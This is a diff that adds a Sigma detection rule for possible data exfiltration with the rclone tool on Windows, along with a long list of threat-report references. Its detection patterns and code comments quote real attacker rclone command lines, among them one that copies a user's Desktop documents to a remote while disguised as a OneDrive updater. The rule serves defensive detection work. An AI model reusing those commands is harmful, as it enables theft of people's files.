@@ -1,0 +1,102 @@
+id: axEFhWDcdyHr
+name: Possible Data Exfiltration over Rclone Tool (via cmdline)
+body: |-
+  title: Possible Data Exfiltration over Rclone Tool (via cmdline)
+  id: e0ee9a7b-fed3-4467-a012-0b04338e1334
+  status: stable
+  description: Need to exclude approved services! Adversaries may exfiltrate data by transferring the data, including backups of cloud environments, to another cloud account they control. The reliance on the surrounding environment may necessitate the implementation of additional filtering measures to prevent false positives.
+  author: SOC Prime Team
+  references:
+    - https://www.cisa.gov/news-events/cybersecurity-advisories/aa26-293a
+    - https://scamdrill.com/blog/teams-help-desk-impersonation-smb
+    - https://www.extrahop.com/blog/aoa-detecting-the-behavior-of-medusa-ransomware-operations
+    - https://www.picussecurity.com/resource/blog/inc-ransomware-explained-how-it-attacks-healthcare-and-education
+    - https://arcticwolf.com/resources/blog/exploitation-of-cve-2026-0257-leads-to-qilin-ransomware/
+    - https://www.picussecurity.com/resource/blog/gamaredon-primitive-bear-apt-profile-and-mitre-attck-breakdown
+    - https://www.picussecurity.com/resource/blog/how-sinobi-ransomware-encrypts-files-and-destroys-backups
+    - https://www.picussecurity.com/resource/blog/tengu-ransomware-attack-chain-from-initial-access-to-encryption
+    - https://labs.yarix.com/2026/05/unusual-data-exfiltration-paths-leveraging-rclone-for-sharepoint-data-theft/
+    - https://thedfirreport.com/2026/05/11/flash-alert-etherrat-and-tuktuk-c2-end-in-the-gentleman-ransomware/
+    - https://medium.com/@DCSO_CyTec/catch-them-while-you-can-5c43007ae99e
+    - https://unit42.paloaltonetworks.com/threat-assessment-blacksuit-ransomware-ignoble-scorpius/
+    - https://www.welivesecurity.com/en/eset-research/cyberespionage-gamaredon-way-analysis-toolset-used-spy-ukraine-2022-2023/
+    - https://unit42.paloaltonetworks.com/repellent-scorpius-cicada3301-ransomware/
+    - https://adlumin.com/post/fog-ransomware-now-targeting-the-financial-sector/
+    - https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-249a
+    - https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-242a
+    - https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-131a
+    - https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-109a
+    - https://www.crowdstrike.com/blog/anatomy-of-alpha-spider-ransomware/
+    - https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/ransomware-data-exfiltration
+    - https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-289a
+    - https://cert.gov.ua/article/5213167
+    - https://jsac.jpcert.or.jp/archive/2023/pdf/JSAC2023_1_1_yamashige-nakatani-tanaka_en.pdf
+    - https://thedfirreport.com/2023/09/25/from-screenconnect-to-hive-ransomware-in-61-hours/
+    - https://www.logpoint.com/wp-content/uploads/2023/12/et-cactus-4-12.pdf
+    - https://thedfirreport.com/2024/01/29/buzzing-on-christmas-eve-trigona-ransomware-in-3-hours/
+    - https://thedfirreport.com/2024/04/29/from-icedid-to-dagon-locker-ransomware-in-29-days/
+    - https://www.huntress.com//blog/lolbin-to-inc-ransomware
+    - https://thedfirreport.com/2024/06/10/icedid-brings-screenconnect-and-csharp-streamer-to-alphv-ransomware-deployment/
+    - https://www.trendmicro.com/en_us/research/24/i/how-ransomhub-ransomware-uses-edrkillshifter-to-disable-edr-and-.html
+    - https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/
+    - https://www.microsoft.com/en-us/security/blog/2025/02/12/the-badpilot-campaign-seashell-blizzard-subgroup-conducts-multiyear-global-access-operation/
+    - https://asec.ahnlab.com/en/86310/
+    - https://www.picussecurity.com/resource/blog/ransomhub
+    - https://thedfirreport.com/2025/02/24/confluence-exploit-leads-to-lockbit-ransomware/
+    - https://www.esentire.com/blog/threat-actors-deploy-sinobi-ransomware-via-compromised-sonicwall-ssl-vpn-credentials
+    - https://arcticwolf.com/resources/blog/smash-and-grab-aggressive-akira-campaign-targets-sonicwall-vpns/
+    - https://sosransomware.com/en/ransomware-groups/worldleaks-between-pure-extortion-and-traditional-ransomware-whats-the-difference/
+    - https://ctrlaltintel.com/threat%20research/MuddyWater/
+    - https://www.seqrite.com/blog/operation-camelclone-multi-region-espionage-campaign-targets-government-and-defense-entities-amidst-regional-tensions/
+    - https://ctrlaltintel.com/research/MuddyWater/
+  tags:
+    - attack.exfiltration
+    - attack.t1567
+  logsource:
+      category: process_creation
+      product: windows
+  detection:
+    selection_name:
+      Image|endswith: 'rclone.exe' # https://arcticwolf.com/resources/blog/exploitation-of-cve-2026-0257-leads-to-qilin-ransomware/; https://www.picussecurity.com/resource/blog/inc-ransomware-explained-how-it-attacks-healthcare-and-education
+      CommandLine|contains: 'rclone' # https://ctrlaltintel.com/research/MuddyWater/; https://labs.yarix.com/2026/05/unusual-data-exfiltration-paths-leveraging-rclone-for-sharepoint-data-theft/
+    selection_args:
+      - CommandLine|contains|all:
+        - 'rcd' #rclone.exe rcd --rc-web-gui
+        - 'rc-web-gui'
+      - CommandLine|contains|all:
+        - 'copy'
+        - 'config'
+        - 'auto-confirm'
+        - '-q' #rclone.exe copy --config=C:/temp/rclone.conf “C:/data” remote:data -q --ignore-existing --auto-confirm
+      - CommandLine|contains|all:
+        - 'copy'
+        - 'remote:'
+        - 'bwlimit'
+      - CommandLine|contains|all:
+        - 'copy'
+        - 'remote:'
+        - 'max-size'
+      - CommandLine|contains|all:
+        - 'copy'
+        - 'mega:' #rclone  copy B:\\MSSQL mega:redacted --progress; https://medium.com/@DCSO_CyTec/catch-them-while-you-can-5c43007ae99e
+      - CommandLine|contains|all:
+        - 'copy'
+        - 'remote:'
+        - 'max-age'
+      - CommandLine|contains|all:
+        - 'copy'
+        - 'remote:'
+        - 'include' #"C:\Users\%USERNAME%\AppData\Local\Microsoft\OneDrive\Update\UpdateService.exe" "copy" "C:\Users\%USERNAME%\Desktop" "remote:%COMPUTERNAME%\Desktop" "--include" "*.{{jpe?g|txt|docx?|rtf|pdf|xlsx?|xlsm|pptx?|zip|rar|7z}}" "-M" "--max-size" "50M" "--max-age" "200d" "--bwlimit" "1M:1M" "--order-by" "modtime,desc" "--log-file=C:\Users\%USERNAME%\AppData\Local\Microsoft\OneDrive\Update\log_1.dat" "-vv"; https://www.seqrite.com/blog/operation-camelclone-multi-region-espionage-campaign-targets-government-and-defense-entities-amidst-regional-tensions/
+    filters:
+      - CommandLine|endswith:
+        - ' config' #rclone.exe  config
+      - CommandLine|contains:
+        - ' mount ' #D:\rclone\rclone.exe  mount my_RC: N: --network-mode --vfs-cache-mode full --no-console
+    condition: (selection_name or selection_args) and not filters
+  falsepositives:
+    - Storage providers approved for business use.
+    - The reliance on the surrounding environment may necessitate the implementation of additional filtering measures to prevent false positives.
+  level: medium
+level: medium
+created: '2023-05-09T09:46:54Z'
+updated: '2026-10-23T09:03:17.435000Z'
